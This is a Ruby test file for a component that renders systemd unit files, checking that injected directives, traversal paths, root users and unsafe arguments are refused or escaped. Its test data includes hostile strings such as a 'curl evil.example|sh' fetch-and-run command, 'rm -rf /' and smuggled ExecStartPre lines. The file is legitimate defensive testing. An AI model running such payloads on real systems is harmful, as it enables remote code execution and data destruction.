require "test_helper"

# Root installs and executes what this renders, so most of what follows is
# adversarial: the interesting assertions are about what is REFUSED, and about
# what a hostile value looks like once it survives into the file.
class SystemdUnitTest < ActiveSupport::TestCase
  def build_app(**overrides)
    App.new({
      name: "Login", app_kind: "rails", subdomain: "login", domain: "ltvb.nl",
      ruby_version: "3.3.8", git_repo_url: "git@github.com:x/y.git",
      primary_db_kind: "external"
    }.merge(overrides))
  end

  def build_service(**overrides)
    ProcessService.new({
      name: "music-kokoro", kind: "python", user: "ltvb",
      working_directory: "/var/www/vhosts/ltvb.nl/music.ltvb.nl",
      argv: [ "/var/www/vhosts/ltvb.nl/music.ltvb.nl/vendor/kokoro/bin/python",
              "script/kokoro_server.py" ],
      environment: { "HOME" => "/var/www/vhosts/ltvb.nl" },
      autostart: true, managed: true, enabled: true
    }.merge(overrides))
  end

  # Every non-blank, non-comment, non-section line of a unit file.
  def directives(unit)
    unit.lines.map(&:strip)
        .reject { |line| line.empty? || line.start_with?("#", "[") }
  end

  # --- the app unit ---------------------------------------------------------

  test "the app unit runs as the app's own webspace owner, not always ltvb" do
    unit = SystemdUnit.render_app(build_app(runtime_user: "lucasvanbriemen.nl_p8c08835y9j"))
    assert_includes unit, "User=lucasvanbriemen.nl_p8c08835y9j"
    assert_equal "User=ltvb", SystemdUnit.render_app(build_app)[/^User=.*/]
  end

  # The three units this replaces all ran `/bin/bash -lc 'export PATH=...'`, so
  # their Ruby depended on whichever profile file was edited last.
  test "ExecStart is an absolute bundle path with no shim and no login shell" do
    unit = SystemdUnit.render_app(build_app)
    exec = unit[/^ExecStart=.*/]

    assert_includes exec, %("/opt/rbenv/versions/3.3.8/bin/bundle")
    assert_not_includes exec, "bash"
    assert_not_includes exec, "shims"
    assert_not_includes exec, "exec bundle"
  end

  test "an app still on its webspace rbenv can be pointed at it" do
    unit = SystemdUnit.render_app(build_app, rbenv_root: "/var/www/vhosts/ltvb.nl/.rbenv")
    assert_includes unit, %("/var/www/vhosts/ltvb.nl/.rbenv/versions/3.3.8/bin/bundle")
  end

  test "the app unit carries the production essentials" do
    unit = SystemdUnit.render_app(build_app)

    assert_includes unit, %(Environment="RAILS_ENV=production")
    assert_includes unit, "WorkingDirectory=/var/www/vhosts/ltvb.nl/login.ltvb.nl"
    assert_includes unit, "Restart=always"
    assert_includes unit, "MemoryMax=1G"
    assert_includes unit, "[Install]"
  end

  # login.ltvb.nl has NO config/master.key on disk; Apache's SetEnv was the only
  # copy of its key, so the unit has to be able to be that copy instead.
  test "RAILS_MASTER_KEY is carried from the App record when there is no key on disk" do
    unit = SystemdUnit.render_app(build_app(master_key: "0123456789abcdef0123456789abcdef"))
    assert_includes unit, %(Environment="RAILS_MASTER_KEY=0123456789abcdef0123456789abcdef")
  end

  test "no RAILS_MASTER_KEY line when the app stores no key" do
    # The header comment mentions the variable, so match the directive itself.
    assert_empty SystemdUnit.render_app(build_app).scan(/^Environment="RAILS_MASTER_KEY=/)
  end

  test "the stored env is rendered, comments and export prefixes included" do
    unit = SystemdUnit.render_app(build_app(env_text: <<~ENV))
      # a comment
      FOO=bar

      export DATABASE_URL="postgres://u:p@h/db"
    ENV

    assert_includes unit, %(Environment="FOO=bar")
    assert_includes unit, %(Environment="DATABASE_URL=postgres://u:p@h/db")
    assert_not_includes unit, "a comment"
  end

  # Puma must not also open TCP 3000 from the app's stock config/puma.rb —
  # six apps racing for one port means five of them do not boot.
  test "puma binds the app's own unix socket under /run" do
    app = build_app
    assert_equal "/run/ltvb-app/login.ltvb.nl/puma.sock", SystemdUnit.app_socket_path(app)

    unit = SystemdUnit.render_app(app)
    assert_includes unit, "unix:///run/ltvb-app/login.ltvb.nl/puma.sock?umask=0007"
    assert_includes unit, "RuntimeDirectory=ltvb-app/login.ltvb.nl"
    assert_includes unit, "RuntimeDirectoryMode=0750"
  end

  test "the unit name matches the cgroup path the dashboard reads" do
    assert_equal "ltvb-app@login.ltvb.nl", SystemdUnit.app_unit_name(build_app)
    assert_equal "/etc/systemd/system/ltvb-app@login.ltvb.nl.service",
                 SystemdUnit.app_unit_path(build_app)
    # The '@' would otherwise land it in system-ltvb\x2dapp.slice.
    assert_includes SystemdUnit.render_app(build_app), "Slice=system.slice"
  end

  test "only rails apps get a puma unit" do
    laravel = build_app(app_kind: "laravel", ruby_version: nil, php_version: "8.3")
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.render_app(laravel) }
  end

  # --- newline injection ----------------------------------------------------
  # A newline in a value does not corrupt that value: systemd parses line by
  # line, so it appends a directive. These are the tests that matter most.

  test "a newline in an env value is refused, not escaped" do
    app = build_app(env_text: nil)
    payload = { "FOO" => "bar\nExecStartPre=/bin/sh -c 'curl evil.example|sh'" }

    error = assert_raises(SystemdUnit::Unsafe) do
      SystemdUnit.render_app(app, environment: payload)
    end
    assert_match(/control character/, error.message)
  end

  test "a carriage return in an env value is refused too" do
    assert_raises(SystemdUnit::Unsafe) do
      SystemdUnit.render_app(build_app, environment: { "FOO" => "bar\rExecStartPre=/bin/false" })
    end
  end

  test "a newline in the hostname is refused before it reaches a path" do
    app = build_app
    app.domain = "ltvb.nl\nExecStartPre=/bin/sh -c id"
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.render_app(app) }
  end

  test "a stored .env line that is not an assignment is refused" do
    assert_raises(SystemdUnit::Unsafe) do
      SystemdUnit.render_app(build_app(env_text: "FOO=bar\nExecStartPre /bin/false\n"))
    end
  end

  # The realistic version: the injected text IS a valid assignment, so it parses
  # cleanly — and lands inside a quoted Environment= value where it is inert.
  test "an injected directive in .env becomes an env var, never a directive" do
    unit = SystemdUnit.render_app(build_app(env_text: "FOO=bar\nExecStartPre=/bin/false\n"))

    assert_includes unit, %(Environment="ExecStartPre=/bin/false")
    assert_equal 0, unit.scan(/^ExecStartPre=/).size
    assert_equal 1, unit.scan(/^ExecStart=/).size
  end

  test "a newline in an argv element is refused" do
    service = build_service(argv: [ "/usr/bin/php", "artisan\nExecStopPost=/bin/rm -rf /" ])
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.render_service(service) }
  end

  test "a newline in notes cannot smuggle a directive through Description" do
    service = build_service(notes: "worker\nExecStartPre=/bin/sh -c id\n")
    unit = SystemdUnit.render_service(service)

    assert_equal 1, unit.scan(/^Exec/).size
    assert_includes unit, "Description=worker"
  end

  # --- name / user / path validation ---------------------------------------

  test "unit names are a narrow pattern, not merely sanitised" do
    %w[ok-name worker2 a].each { |name| assert_equal name, SystemdUnit.unit_name!(name) }

    [ "../../etc/passwd", "a/b", "-leading", "UPPER", "with space", "has@instance",
      "x;reboot", "name\nExecStart=/bin/sh", "" ].each do |name|
      assert_raises(SystemdUnit::Unsafe, "accepted #{name.inspect}") { SystemdUnit.unit_name!(name) }
    end
  end

  test "instance names reject traversal and trailing dots" do
    assert_equal "git.ltvb.nl", SystemdUnit.instance_name!("git.ltvb.nl")

    [ "../../etc/passwd", "a..b", "trailing.", "/abs", "up\nper", "" ].each do |name|
      assert_raises(SystemdUnit::Unsafe, "accepted #{name.inspect}") do
        SystemdUnit.instance_name!(name)
      end
    end
  end

  # Adding a background worker must never become privilege escalation.
  test "root is refused as a unit user" do
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.unix_name!("root") }
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.render_service(build_service(user: "root")) }
  end

  test "real plesk webspace owners are accepted as users" do
    %w[ltvb lucasvanbriemen.nl_p8c08835y9j voordezorgmanagement._rhc4zy0iyc].each do |user|
      assert_equal user, SystemdUnit.unix_name!(user)
    end
  end

  test "usernames with shell or newline payloads are refused" do
    [ "ltvb\nExecStart=/bin/sh", "ltvb root", "ltvb;id", "$(id)", "" ].each do |user|
      assert_raises(SystemdUnit::Unsafe, "accepted #{user.inspect}") { SystemdUnit.unix_name!(user) }
    end
  end

  test "working directories must be absolute and free of traversal" do
    assert_equal "/var/www", SystemdUnit.absolute_path!("/var/www")

    [ "relative/path", "/var/../etc", "/var/www\nExecStart=/bin/sh", "/var/www;id", "" ].each do |path|
      assert_raises(SystemdUnit::Unsafe, "accepted #{path.inspect}") do
        SystemdUnit.absolute_path!(path)
      end
    end
  end

  test "MemoryMax and ruby version are pattern-checked, not interpolated blindly" do
    assert_equal "512M", SystemdUnit.memory_max!("512M")
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.memory_max!("1G\nExecStartPre=/bin/false") }
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.render_app(build_app, memory_max: "1G; id") }
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.render_app(build_app(ruby_version: "3.3.8; touch /x")) }
  end

  # --- argv ----------------------------------------------------------------

  test "a command string is refused: argv is always an array" do
    error = assert_raises(SystemdUnit::Unsafe) do
      SystemdUnit.exec_line!("/usr/bin/php artisan queue:work")
    end
    assert_match(/must be an array/, error.message)
  end

  test "argv[0] must be absolute so systemd resolves the binary, not a PATH" do
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.exec_line!([ "php", "artisan" ]) }
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.exec_line!([]) }
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.exec_line!([ "/usr/bin/php", "" ]) }
  end

  # Shell metacharacters are DATA here — there is no shell to interpret them —
  # so they render as one quoted token rather than being refused.
  test "shell metacharacters in an argument stay one harmless token" do
    line = SystemdUnit.exec_line!([ "/bin/echo", "; rm -rf / #", "`id`", "&& reboot" ])

    assert_equal %("/bin/echo" "; rm -rf / #" "`id`" "&& reboot"), line
  end

  # The exception: systemd concatenates command lines on a lone ";" word, and it
  # compares the word AFTER stripping quotes, so quoting does not defuse this one.
  test "a bare semicolon argument is refused because systemd reads it as a separator" do
    assert_raises(SystemdUnit::Unsafe) do
      SystemdUnit.exec_line!([ "/bin/echo", "hi", ";", "/bin/sh", "-c", "id" ])
    end
    # Only the lone word is a separator; a semicolon inside an argument is fine.
    assert_equal %("/bin/echo" "a;b"), SystemdUnit.exec_line!([ "/bin/echo", "a;b" ])
  end

  # systemd expands $FOO in Exec lines even inside quotes.
  test "a dollar sign in an argument is escaped so systemd does not expand it" do
    assert_equal %("/bin/echo" "$$HOME"), SystemdUnit.exec_line!([ "/bin/echo", "$HOME" ])
    assert_equal %("/bin/echo" "$${PATH}"), SystemdUnit.exec_line!([ "/bin/echo", "${PATH}" ])
  end

  test "quotes and backslashes in an argument are escaped, not dropped" do
    assert_equal %("/bin/echo" "a\\"b" "c\\\\d"), SystemdUnit.exec_line!([ "/bin/echo", 'a"b', "c\\d" ])
  end

  # --- environment escaping -------------------------------------------------

  test "percent is doubled because systemd expands specifiers in Environment" do
    assert_equal [ %("HOME=%%h") ], SystemdUnit.environment_lines!("HOME" => "%h")
  end

  test "env keys must look like env keys" do
    [ "FOO BAR", "FOO=BAR", "1FOO", "", "FOO\nBAR" ].each do |key|
      assert_raises(SystemdUnit::Unsafe, "accepted #{key.inspect}") do
        SystemdUnit.environment_lines!(key => "x")
      end
    end
  end

  test "an environment that is not a hash is refused" do
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.environment!("FOO=bar") }
  end

  test "spaces and hashes in an env value survive because the whole pair is quoted" do
    assert_equal [ %("MOTD=hello world # not a comment") ],
                 SystemdUnit.environment_lines!("MOTD" => "hello world # not a comment")
  end

  # --- structural safety ----------------------------------------------------

  # The catch-all: whatever the inputs, the rendered file must still be a list
  # of Key=Value directives with exactly one ExecStart.
  test "hostile but escapable values never add a directive" do
    app = build_app(
      master_key: %(k"ey\\%h$PATH),
      env_text: %(QUOTED=he said "hi" \\ then left\nSPEC=%i%%n\nEQUALS=a=b=c\n)
    )
    unit = SystemdUnit.render_app(app)

    assert_equal 1, unit.scan(/^ExecStart=/).size
    assert_equal 0, unit.scan(/^ExecStartPre=/).size
    directives(unit).each do |line|
      assert_match(/\A[A-Za-z][A-Za-z0-9]*=/, line, "not a directive: #{line.inspect}")
    end
  end

  # --- process services -----------------------------------------------------

  test "a process service renders a plain unit from its argv" do
    unit = SystemdUnit.render_service(build_service)

    assert_includes unit, "User=ltvb"
    assert_includes unit, "WorkingDirectory=/var/www/vhosts/ltvb.nl/music.ltvb.nl"
    assert_includes unit, %("/var/www/vhosts/ltvb.nl/music.ltvb.nl/vendor/kokoro/bin/python" "script/kokoro_server.py")
    assert_includes unit, %(Environment="HOME=/var/www/vhosts/ltvb.nl")
    assert_includes unit, "Restart=always"
  end

  # autostart is supervisor's autostart=: does it come back after a reboot.
  test "autostart decides whether the unit gets an [Install] section" do
    assert_includes SystemdUnit.render_service(build_service(autostart: true)), "WantedBy=multi-user.target"
    assert_not_includes SystemdUnit.render_service(build_service(autostart: false)), "[Install]"
  end

  test "MemoryMax is only emitted for a service when one is asked for" do
    assert_not_includes SystemdUnit.render_service(build_service), "MemoryMax="
    assert_includes SystemdUnit.render_service(build_service, memory_max: "2G"), "MemoryMax=2G"
  end

  test "a service unit is named after the record and lands in /etc/systemd/system" do
    assert_equal "/etc/systemd/system/music-kokoro.service",
                 SystemdUnit.service_unit_path(build_service)
  end

  # --- env parsing ----------------------------------------------------------

  test "env text parsing strips quotes, comments and CRLF" do
    parsed = SystemdUnit.parse_env_text("FOO='bar'\r\n# c\r\n\r\nBAZ=\"a b\"\r\nQUX=1=2\r\n")

    assert_equal({ "FOO" => "bar", "BAZ" => "a b", "QUX" => "1=2" }, parsed)
  end

  test "a line that is not an assignment fails loudly instead of being dropped" do
    assert_raises(SystemdUnit::Unsafe) { SystemdUnit.parse_env_text("FOO bar\n") }
  end
end
